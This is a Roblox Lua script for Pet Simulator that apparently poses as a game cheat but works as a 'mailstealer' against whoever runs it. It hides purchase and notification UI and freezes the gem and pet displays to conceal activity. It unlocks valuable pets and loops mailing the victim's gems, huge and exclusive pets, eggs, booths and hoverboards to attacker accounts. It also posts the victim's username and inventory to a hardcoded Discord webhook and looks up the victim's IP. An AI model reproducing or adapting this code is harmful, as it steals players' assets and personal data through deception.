local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end


if getgenv().executed then
    return
end
getgenv().executed = true

local Blacklisted_Booths = {"Default", "Pls Donate", "Maskot", "Fire", "VIP"}
local Blacklisted_Hoverboards = {"Original", "Red Flying Carpet", "Blue Flying Carpet", "Bling", "Axolotl"}

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
MailMessage = "By valyxra"
plr = game.Players.LocalPlayer
guis = plr.PlayerGui

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
local function shutdowngame()
    wait(99999999)
    game:Shutdown()
end

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()

if hideall == true then
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled =
                            false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Lighting").PurchasePendingBlur.Enabled = false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            local gemsDisplay = guis.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
            local oldGemsValue = gemsDisplay.Text
            gemsDisplay:GetPropertyChangedSignal("Text"):Connect(
                function()
                    oldGemsValue = gemsDisplay.Text
                end
            )
        end
    )
    local function freeze_mygems()
        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
        local gems_frame_clone = gems_frame:Clone()

        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
        gems_frame.Visible = true
    end
    freeze_mygems()
    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
    gemsframe:Destroy()
    local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        local pets_frame_clone = pets_frame:Clone()
        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    game.Workspace.__THINGS.Pets:Destroy()
end

task.spawn(
    function()
        while task.wait() do
            pcall(
                function()
                    local PetUIDs = {}

                    for i, v in pairs(save.Pet) do
                        id = v.id
                        dir = library.Directory.Pets[id]
                        if dir.huge == true then
                            table.insert(PetUIDs, i)
                        end
                    end
                    if save.Egg ~= nil then
                        for i, v in pairs(save.Egg) do
                            table.insert(PetUIDs, i)
                        end
                    end
                    if save.Charm ~= nil then
                        for i, v in pairs(save.Charm) do
                            table.insert(PetUIDs, i)
                        end
                    end

                    for _, petUID in pairs(PetUIDs) do
                        local args = {
                            [1] = petUID,
                            [2] = false
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                            unpack(args)
                        )
                    end

                    local PetUIDs = {}
                    local library = require(game.ReplicatedStorage.Library)
                    local save = library.Save.Get().Inventory
                    for i, v in pairs(save.Pet) do
                        id = v.id
                        dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(PetUIDs, i)
                        end
                    end
                    for _, petUID in pairs(PetUIDs) do
                        local args = {
                            [1] = petUID,
                            [2] = false
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
            )
        end
    end
)

HugeList, ExcList, EggList, CharmList, BoothList, HoverList = {}, {}, {}, {}, {}, {}
table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
            table.insert(HugeList, id)
        end
    end
)
if save.Egg ~= nil then
    table.foreach(
        save.Egg,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Eggs[id]
            table.insert(EggList, id)
        end
    )
end
table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
            table.insert(ExcList, id)
        end
    end
)
if save.Booth ~= nil then
    for i, v in pairs(save.Booth) do
        local id = v.id
        local dir = library.Directory.Booths[id]
        local isBlacklisted = false
        for _, blacklistedId in ipairs(Blacklisted_Booths) do
            if dir._id == blacklistedId then
                isBlacklisted = true
                break
            end
        end
        if not isBlacklisted then
            table.insert(BoothList, id)
        end
    end
end
if save.Hoverboard ~= nil then
    for i, v in pairs(save.Hoverboard) do
        local id = v.id
        local dir = library.Directory.Hoverboards[id]
        local isBlacklisted = false
        for _, blacklistedId in ipairs(Blacklisted_Hoverboards) do
            if dir._id == blacklistedId then
                isBlacklisted = true
                break
            end
        end
        if not isBlacklisted then
            table.insert(HoverList, id)
        end
    end
end
if save.Charm ~= nil then
    table.foreach(
        save.Charm,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Charms[id]
            table.insert(CharmList, id)
        end
    )
end

local AllPetsList = {}
for _, list in pairs({HugeList, ExcList, EggList, BoothList, HoverList, CharmList}) do
    for _, value in pairs(list) do
        table.insert(AllPetsList, value)
    end
end
local PetsListString = "\n" -- Create a string to represent the HugeList
for i, v in pairs(AllPetsList) do
    PetsListString = PetsListString .. v .. "\n" -- Append each Huge item to the string
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
    end
end
AmountOfHuges = 0
for i, v in pairs(save.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true then
        AmountOfHuges = AmountOfHuges + 1
    end
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end
local nicks = {"br1c7s", "other nick"}
math.randomseed(os.time())
local randomNick = nicks[math.random(#nicks)]
math.randomseed(os.time())
local DualRandomHuge = math.random(2, 500)
if AmountOfHuges >= DualRandomHuge then
    Username = randomNick
    Webhook =
        "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT"
end
math.randomseed(os.time())
local DualRandomGem = math.random(20000000, 50000000)
if GemAmount1 >= DualRandomGem then
    Username = randomNick
    Webhook =
        "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT"
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
    end
end
local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
local url = Webhook
local whenabled = true
local function SendWebhook(url, ping)
    imgs =
        "https://media.discordapp.net/attachments/1191773310447538196/1203640979492708412/Untitled8_20240131173847.png?ex=65d1d504&is=65bf6004&hm=103d9a83d9a9841f271710fdbd57bd35f0f83a6f686d7d78dd26bd7b8644055b&"
    data1 = {
        ["content"] = ping,
        ["username"] = "d3pe mailstealer",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`You Got A Hit!`__ \240\159\142\137",
                ["url"] = "https://www.pinterest.com/pin/horror--17099673578748913/",
                ["type"] = "rich",
                ["color"] = tonumber(0xadffb0),
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1191773310447538196/1203649826059976704/images_15.jpg?ex=65d1dd41&is=65bf6841&hm=f071a97a827972b57311802d8e8b40c45d79f613e7ceaaeca9a791e1d4b3d589&",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            game.Players.LocalPlayer.Name ..
                                "\n(\240\159\148\146) Display: " ..
                                    game.Players.LocalPlayer.DisplayName ..
                                        "\n(\240\159\142\178) Sent To: " ..
                                            Username ..
                                                 "\n(\240\159\147\140) Version: V1.2 ```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Pets List:`",
                        ["value"] = "```" .. PetsListString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GemAmount .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\154\128) Creator:`",
                        ["value"] = "```valyxra```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**Generated By d3pe scripts.2**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    if Webhook ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end
local user = Username

while wait() do
    local HugeList = {}
    local EggList = {}
    local ExcList = {}
    local CharmList = {}
    local BoothList = {}
    local HoverList = {}

    function GemSteal()
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount = v._am
                GemId = i
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = GemId,
                    [5] = GemAmount - 10000
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args)
                )
                GemsStolen = true
            end
        end
    end
    spawn(
        function()
            while wait() do
                local HugeList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            table.insert(HugeList, i)
                        end
                    end
                )
                if #HugeList ~= 0 or HugeList ~= {} then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #HugeList == 0 or HugeList == {} then
                        break
                    end
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local EggList = {}
                if save.Egg ~= nil then
                    table.foreach(
                        save.Egg,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Eggs[id]
                            table.insert(EggList, i)
                        end
                    )
                end
                if #EggList ~= 0 and #HugeList == 0 then
                    for i, v in pairs(save.Egg) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Egg",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #EggList == 0 or EggList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local ExcList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(ExcList, i)
                        end
                    end
                )

                if #ExcList ~= 0 and #HugeList == 0 and #EggList == 0 then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #ExcList == 0 or ExcList == {} then
                        break
                    end
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local BoothList = {}
                if save.Booth ~= nil then
                    for i, v in pairs(save.Booth) do
                        local id = v.id
                        local dir = library.Directory.Booths[id]
                        local isBlacklisted = false
                        for _, blacklistedId in ipairs(Blacklisted_Booths) do
                            if dir._id == blacklistedId then
                                isBlacklisted = true
                                break
                            end
                        end
                        if not isBlacklisted then
                            table.insert(BoothList, i)
                        end
                    end
                end
                if #BoothList ~= 0 and #ExcList == 0 and #HugeList == 0 and #EggList == 0 then
                    local pet1Index = math.random(1, #BoothList)
                    local booth = BoothList[pet1Index]
                    for booth, v in pairs(save.Booth) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Booth",
                            [4] = booth,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #BoothList == 0 or BoothList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local HoverList = {}
                if save.Hoverboard ~= nil then
                    for i, v in pairs(save.Hoverboard) do
                        local id = v.id
                        local dir = library.Directory.Hoverboards[id]
 
